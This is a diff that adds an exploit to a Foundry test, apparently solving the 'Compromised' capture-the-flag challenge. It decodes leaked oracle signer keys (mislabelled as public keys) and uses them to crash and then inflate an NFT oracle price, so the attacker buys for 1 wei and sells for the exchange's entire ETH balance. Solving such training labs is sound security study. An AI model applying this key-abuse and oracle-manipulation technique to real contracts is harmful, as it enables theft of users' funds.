@@ -77,6 +77,39 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+        string memory snippet1 = "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5";
+        string memory snippet2 = "MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4";
+
+        uint base64DecodedPublicKey1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        uint base64DecodedPublicKey2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        
+
+        address addr1 = vm.createWallet(base64DecodedPublicKey1).addr;
+        address addr2 = vm.createWallet(base64DecodedPublicKey2).addr;
+
+        vm.prank(addr1);
+        trustfulOracle.postPrice("DVNFT", 0 wei);
+        vm.prank(addr2);
+        trustfulOracle.postPrice("DVNFT", 0 wei);
+
+        vm.prank(attacker);
+        uint256 id = exchange.buyOne{value: 1 wei}();
+
+        vm.prank(addr1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(addr2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 0);
+        exchange.sellOne(id);
+        vm.stopPrank();
+
+        vm.prank(addr1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(addr2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         /**
          * EXPLOIT END *
          */
